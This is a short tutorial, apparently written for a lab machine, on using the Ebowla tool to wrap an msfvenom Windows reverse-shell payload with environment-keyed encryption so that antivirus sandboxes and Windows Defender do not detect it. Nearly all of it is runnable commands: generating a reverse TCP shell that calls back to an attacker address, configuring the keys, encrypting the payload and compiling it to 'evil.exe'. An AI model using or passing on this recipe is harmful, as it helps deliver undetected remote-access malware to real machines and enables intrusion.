## How Ebowla Works

```
msfvenom payload
      ↓
Ebowla wraps it with environmental keys
      ↓
Encrypted payload that only runs if:
- Specific username exists
- Specific hostname exists
- Specific environment variables exist
      ↓
AV can't detonate it in sandbox = bypasses detection
```

---

## Install Ebowla

```bash
git clone https://github.com/Genetic-Malware/Ebowla
cd Ebowla
pip install configobj
pip install pyinstaller
```

---

## Step 1 — Generate Base Payload

```bash
msfvenom -p windows/x64/shell_reverse_tcp \
  LHOST=10.10.14.5 \
  LPORT=4444 \
  -f exe -o shell.exe
```

---

## Step 2 — Configure Ebowla

Edit `genetic.config`:

```ini
[overall]
output_type = GO
payload_type = EXE

[genkey]
# Environmental keys — conditions that must be true to run
username = Stacy
hostname = Giddy
```

---

## Step 3 — Wrap Payload

```bash
python ebowla.py shell.exe genetic.config
```

---

## Step 4 — Compile to EXE

```bash
./build_x64_go.sh output/go_symmetric_shell.exe.go evil.exe
```

---

## Why It Bypasses AV

```
Normal msfvenom exe  → AV scans = known signature = blocked
Ebowla wrapped exe   → AV scans = encrypted blob = no signature
                     → AV sandbox = wrong environment = never decrypts
                     → AV passes it = payload runs on real machine
```

---

## TL;DR

```
1. Generate payload with msfvenom
2. Configure genetic.config with env keys
3. ebowla.py wraps and encrypts it
4. Compile with build_x64_go.sh
5. Transfer to box → Defender can't detect it
```